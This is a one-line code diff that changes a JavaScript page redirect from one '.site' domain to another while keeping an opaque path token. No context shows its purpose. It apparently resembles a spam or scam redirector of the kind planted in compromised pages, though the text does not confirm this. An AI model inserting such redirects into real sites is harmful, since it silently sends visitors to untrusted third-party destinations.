@@ -1,1 +1,1 @@
-window.location.href = "https://robusa.site/c4k36Dwc";
+window.location.href = "https://potenty.site/c4k36Dwc";
